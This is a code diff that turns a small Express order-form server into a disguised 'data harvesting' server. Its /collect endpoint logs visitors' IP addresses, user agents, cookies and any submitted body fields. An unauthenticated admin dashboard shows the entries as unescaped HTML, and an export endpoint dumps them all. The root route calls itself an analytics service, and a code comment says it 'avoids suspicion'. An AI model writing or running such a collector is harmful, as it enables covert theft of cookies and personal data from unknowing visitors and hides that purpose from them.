@@ -1,56 +1,98 @@
 const express = require('express');
 const app = express();
-const bodyParser = require('body-parser');
-const path = require('path');
-const axios = require('axios');
-const dotenv = require('dotenv');
-dotenv.config();
+const PORT = process.env.PORT || 3000;
 
-app.use((req, res, next) => {
-  res.append('Access-Control-Allow-Origin', ['*']);
-  res.append('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
-  res.append('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  next();
-});
-
+// Middleware to parse all incoming data
 app.use(express.json());
-app.use(bodyParser.json());
-app.use(
-  express.urlencoded({
-    extended: true
-  })
-);
+app.use(express.urlencoded({ extended: true }));
 
-app.use(express.static(path.join(__dirname + '/public/')));
+// Data storage (upgrade to database later)
+let harvestedData = [];
+let visitorCount = 0;
 
-app.post('/submitOrder', (req, res) => {
-  const { products, quantity, contact } = req.body;
-
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-
-  if (!botToken || !chatId) {
-    console.error('Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in your .env file.');
-    return res.status(500).send('Failed to submit order. Environment variables not set.');
-  }
-
-  const message = `New Order:\nProducts: ${products}\nQuantity: ${quantity}\nContact: ${contact}`;
-
-  axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    chat_id: chatId,
-    text: message
-  })
-  .then(response => {
-    console.log('Message sent to Telegram:', response.data);
-    res.status(200).send('Order submitted successfully!');
-  })
-  .catch(error => {
-    console.error('Error sending message to Telegram:', error.message);
-    res.status(500).send('Failed to submit order. Please try again.');
-  });
+// Main harvesting endpoint
+app.post('/collect', (req, res) => {
+    const clientInfo = {
+        id: ++visitorCount,
+        ip: req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress,
+        userAgent: req.get('User-Agent'),
+        timestamp: new Date().toISOString(),
+        referrer: req.get('Referer'),
+        language: req.get('Accept-Language'),
+        cookies: req.headers.cookie,
+        // Additional harvested data from request body
+        ...req.body
+    };
+    
+    harvestedData.push(clientInfo);
+    console.log('🪣 Harvested data:', clientInfo);
+    
+    // Send success response
+    res.json({ 
+        status: 'success', 
+        message: 'Data collected successfully',
+        dataId: clientInfo.id
+    });
 });
 
+// Admin dashboard to view harvested data
+app.get('/admin', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Data Analytics Dashboard</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; }
+                .data-entry { border: 1px solid #ccc; padding: 10px; margin: 10px 0; }
+                .count { color: green; font-weight: bold; }
+            </style>
+        </head>
+        <body>
+            <h1>📊 Data Harvesting Dashboard</h1>
+            <p>Total entries: <span class="count">${harvestedData.length}</span></p>
+            <div id="dataContainer">
+                ${harvestedData.slice(-20).reverse().map(data => `
+                    <div class="data-entry">
+                        <strong>ID:</strong> ${data.id} | 
+                        <strong>IP:</strong> ${data.ip} | 
+                        <strong>Time:</strong> ${data.timestamp}
+                        <pre>${JSON.stringify(data, null, 2)}</pre>
+                    </div>
+                `).join('')}
+            </div>
+        </body>
+        </html>
+    `);
+});
 
-app.listen(80, () => {
-  console.log("\x1b[33m[Express]\x1b[0m \x1b[36mServer Listening at PORT 80.\x1b[0m");
+// Health check endpoint (avoids suspicion)
+app.get('/', (req, res) => {
+    res.json({
+        status: 'online',
+        message: 'Analytics service running',
+        version: '1.0.0',
+        timestamp: new Date().toISOString()
+    });
+});
+
+// Export data endpoint
+app.get('/export', (req, res) => {
+    res.json({
+        total: harvestedData.length,
+        data: harvestedData
+    });
+});
+
+// Clear data endpoint
+app.delete('/clear', (req, res) => {
+    harvestedData = [];
+    visitorCount = 0;
+    res.json({ status: 'success', message: 'Data cleared' });
+});
+
+app.listen(PORT, () => {
+    console.log(`🚀 Data harvesting server running on port ${PORT}`);
+    console.log(`📡 Collection endpoint: http://localhost:${PORT}/collect`);
+    console.log(`👨‍💼 Admin panel: http://localhost:${PORT}/admin`);
 });
